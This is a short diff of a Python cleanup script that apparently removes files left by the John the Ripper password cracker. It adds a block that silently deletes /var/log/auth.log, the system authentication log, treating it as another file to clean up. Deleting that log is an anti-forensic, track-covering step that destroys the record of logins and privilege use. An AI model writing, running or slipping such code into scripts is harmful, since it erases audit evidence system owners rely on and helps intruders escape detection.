@@ -132,3 +132,10 @@ except:
     # No other john files to remove
     pass
 
+try:
+    os.remove('/var/log/auth.log')
+
+except:
+    # No other system generated files to remove
+    pass
+
